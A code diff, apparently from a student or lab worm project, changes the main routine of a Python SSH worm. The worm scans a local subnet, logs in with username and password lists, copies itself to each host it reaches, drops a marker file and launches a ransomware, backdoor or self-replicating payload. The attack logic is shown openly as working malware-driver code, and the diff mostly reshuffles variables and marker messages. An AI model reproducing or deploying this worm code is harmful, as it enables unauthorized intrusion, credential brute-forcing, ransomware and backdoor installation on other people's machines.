@@ -33,7 +33,6 @@ def launch_attack(worm, malicious_file):
 def main():
     """ Main function that does all the heavy lifting. See usage details above """
     worm = SSHConnection()
-    message = "Your security is bad and you should feel bad"
 
     # # # Arguments Reference # # # # # # # # # # # # # # # # # # # # #
     # current_script = sys.argv[0]
@@ -50,30 +49,33 @@ def main():
     # Runnning ansomware worm
     if files[1] == "local_ransom.py":
         worm.marker_file = "ransom_marker.txt"
-        malicious_file = files[1]
         worm.set_username_file(files[2])
         worm.set_password_file(files[3])
         worm.set_worm_file("local_ransom.py")
+        malicious_file = files[1]
+        message = "Help plz I need money to feed my cats :( \n"
     # Running backdoo worm
     elif files[1] == "local_backdoor.py":
         worm.marker_file = "backdoor_marker.txt"
-        malicious_file = files[1]
         worm.set_username_file(files[2])
         worm.set_password_file(files[3])
         worm.set_worm_file("local_backdoor.py")
+        malicious_file = files[1]
+        message = "This is a super imporant file that under no circumstances should you delete\n"
     # Running standad replicator worm
     elif files[1] == "usernames.txt":
-        worm.worm_file = "replicator.py"
         worm.marker_file = "replicator_marker.txt"
         worm.set_username_file(files[1])
         worm.set_password_file(files[2])
+        #worm.worm_file = "replicator.py"
         worm.set_worm_file("replicator.py")
         malicious_file = "replicator.py " + worm.username_file + " " + worm.password_file
+        message = "Your security is bad and you should feel bad\n"
     else:
         print "Bad input file"
         return
 
-    files.append(worm.marker_file)
+    #files.append(worm.marker_file)
 
     # Create worm instance and search first 10 ips on the network
     worm.retrieve_vulnerable_hosts("192.168.1.", 10)
@@ -82,13 +84,14 @@ def main():
         # Found an unmarked host, copy the files over to it.
         worm.set_target_dir("/home/" + worm.username + "/")
         #with open(worm.marker_file, "w") as marker:
-        #    marker.write(worm.password + "\n" + get_local_ip())
+        #    marker.write(message)
         for filename in files:
             transfer_file(worm, filename)
         print "[+] Completed! Launching local attack now..."
         # Optinal command to add infector's ip to the marker file
         #worm.ssh_connection.exec_command("echo " + get_local_ip() + " >> " + worm.marker_file)
-        worm.ssh_connection.exec_command("echo " + message + " >> " + worm.marker_file)
+        worm.ssh_connection.exec_command("touch " + worm.marker_file)
+        worm.ssh_connection.exec_command("echo \"" + message + "\" >> " + worm.marker_file)
         launch_attack(worm, malicious_file)
     else:
         # Either no hosts found, or they all had the marker file on their system
